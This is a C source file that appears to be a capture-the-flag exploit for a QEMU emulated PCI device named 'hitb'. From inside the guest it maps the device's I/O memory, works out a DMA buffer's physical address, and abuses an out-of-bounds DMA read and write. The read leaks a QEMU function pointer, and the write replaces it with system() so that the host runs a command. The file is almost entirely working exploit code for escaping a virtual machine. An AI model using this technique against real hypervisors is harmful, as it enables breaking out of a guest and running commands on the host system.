#include <assert.h>
#include <fcntl.h>
#include <inttypes.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <unistd.h>

#define DMA_BASE 0x40000

unsigned char* iomem;
unsigned char* dmabuf;
uint64_t dmabuf_phys_addr;

void die(const char* msg)
{
    perror(msg);
    exit(-1);
}

void hexdump(uint8_t* mem, size_t len)
{
    for (size_t i = 1; i <= len; i++) {
        printf("%02x ", mem[i-1]);
        if (i % 16 == 0)
            printf("\n");
        else if (i % 8 == 0)
            printf("  ");
    }
}

// See https://www.kernel.org/doc/Documentation/vm/pagemap.txt
uint64_t virt2phys(void* p)
{
    uint64_t virt = (uint64_t)p;

    // Assert page alignment
    assert((virt & 0xfff) == 0);

    int fd = open("/proc/self/pagemap", O_RDONLY);
    if (fd == -1)
        die("open");

    uint64_t offset = (virt / 0x1000) * 8;
    lseek(fd, offset, SEEK_SET);

    uint64_t phys;
    if (read(fd, &phys, 8 ) != 8)
        die("read");

    // Assert page present
    assert(phys & (1ULL << 63));

    phys = (phys & ((1ULL << 54) - 1)) * 0x1000;
    return phys;
}

void iowrite(uint64_t addr, uint64_t value)
{
    *((uint64_t*)(iomem + addr)) = value;
}

uint64_t ioread(uint64_t addr)
{
    return *((uint64_t*)(iomem + addr));
}

void dma_setcnt(uint32_t cnt)
{
    iowrite(144, cnt);
}

void dma_setdst(uint32_t dst)
{
    iowrite(136, dst);
}

void dma_setsrc(uint32_t src)
{
    iowrite(128, src);
}

void dma_start(uint32_t cmd)
{
    iowrite(152, cmd | 1);
}

void* dma_read(uint64_t addr, size_t len)
{
    dma_setsrc(addr);
    dma_setdst(dmabuf_phys_addr);
    dma_setcnt(len);

    dma_start(2);

    sleep(1);
}

void dma_write(uint64_t addr, void* buf, size_t len)
{
    assert(len < 0x1000);
    memcpy(dmabuf, buf, len);

    dma_setsrc(dmabuf_phys_addr);
    dma_setdst(addr);
    dma_setcnt(len);

    dma_start(0);

    sleep(1);
}

void dma_write_qword(uint64_t addr, uint64_t value)
{
    dma_write(addr, &value, 8);
}

uint64_t dma_read_qword(uint64_t addr)
{
    dma_read(addr, 8);
    return *((uint64_t*)dmabuf);
}

void dma_crypted_read(uint64_t addr, size_t len)
{
    dma_setsrc(addr);
    dma_setdst(dmabuf_phys_addr);
    dma_setcnt(len);

    dma_start(4 | 2);

    sleep(1);
}

int main(int argc, char *argv[])
{
    // Open and map I/O memory for the hitb device
    int fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR | O_SYNC);
    if (fd == -1)
        die("open");

    iomem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (iomem == MAP_FAILED)
        die("mmap");

    printf("iomem @ %p\n", iomem);

    // Allocate DMA buffer and obtain its physical address
	dmabuf = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (dmabuf == MAP_FAILED)
        die("mmap");

    mlock(dmabuf, 0x1000);
	dmabuf_phys_addr = virt2phys(dmabuf);

    printf("DMA buffer (virt) @ %p\n", dmabuf);
	printf("DMA buffer (phys) @ %p\n", (void*)dmabuf_phys_addr);

    // DMA testing
    //dma_write(dma_base, "hello world!", 0x12);
    //memset(dmabuf, 0, 0x1000);
    //dma_read(dma_base, 0x100);
    //hexdump(dmabuf, 0x100);

    // Exploit the OOB read/write to leak a function pointer into the qemu binary ...
    uint64_t hitb_enc = dma_read_qword(DMA_BASE + 0x1000);
    uint64_t binary = hitb_enc - 0x283dd0;
    printf("binary @ 0x%lx\n", binary);
    uint64_t system = binary + 0x1fdb18;

    // ... then exploit the bug again to overwrite the function pointer ...
    dma_write_qword(DMA_BASE + 0x1000, system);
    char* payload = "cat flag;";          // RDI will point to this string at the start of the hijacked function call
    dma_write(DMA_BASE + 0x100, payload, strlen(payload));

    // ... and finally have qemu call it
    dma_crypted_read(DMA_BASE + 0x100, 0x1);

    return 0;
}
